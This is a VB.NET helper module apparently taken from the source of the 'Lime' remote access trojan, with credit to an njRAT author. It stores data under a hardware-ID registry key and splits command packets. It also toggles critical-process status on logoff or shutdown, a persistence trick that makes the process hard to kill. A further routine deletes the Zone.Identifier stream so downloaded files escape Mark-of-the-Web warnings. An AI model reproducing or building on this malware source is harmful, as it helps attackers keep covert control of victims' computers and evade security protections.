Namespace Lime

    Module C_Fuctions

        Function SB(ByVal s As String) As Byte() ' string to byte()
            Return Text.Encoding.UTF8.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String ' byte() to string
            Return Text.Encoding.UTF8.GetString(b)
        End Function

        Function DLV(ByVal n As String) ' delete value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).DeleteValue(n)
            Catch ex As Exception
            End Try
        End Function

        Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
            Try
                Return Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).GetValue(n, "")
            Catch ex As Exception
                Return Nothing
            End Try
        End Function

        Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).SetValue(n, t)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function


        'credit to njq8
        'a better way to split packets
        Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
            Dim a As New Collections.Generic.List(Of Byte())
            Dim M As New IO.MemoryStream
            Dim MM As New IO.MemoryStream
            Dim T As String() = Split(BS(b), WRD)
            M.Write(b, 0, T(0).Length)
            MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
            a.Add(M.ToArray)
            a.Add(MM.ToArray)
            M.Dispose()
            MM.Dispose()
            Return a.ToArray
        End Function

        Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                C_CriticalProcess.CriticalProcesses_Disable()
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                C_CriticalProcess.CriticalProcesses_Disable()
            End If
        End Sub

        Public Function GZip(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
            If CM Then
                Dim buffer As Byte() = Nothing
                Using MS As New IO.MemoryStream
                    Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
                    Ziped.Write(B, 0, B.Length)
                    Ziped.Dispose()
                    MS.Position = 0
                    buffer = New Byte((CInt(MS.Length) + 1) - 1) {}
                    MS.Read(buffer, 0, buffer.Length)
                    MS.Dispose()
                End Using
                Return buffer
            Else
                Dim array As Byte() = Nothing
                Using MS As New IO.MemoryStream(B)
                    Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
                    Dim buffer As Byte() = New Byte(4 - 1) {}
                    MS.Position = (MS.Length - 5)
                    MS.Read(buffer, 0, 4)
                    Dim count As Integer = BitConverter.ToInt32(buffer, 0)
                    MS.Position = 0
                    array = New Byte(((count - 1) + 1) - 1) {}
                    Ziped.Read(array, 0, count)
                    Ziped.Dispose()
                    MS.Dispose()
                End Using
                Return array
            End If
        End Function

        <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
        Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
            ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
        End Function
        Sub DeleteZoneIdentifier(ByVal filePath As String)
            Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
        End Sub

    End Module
End Namespace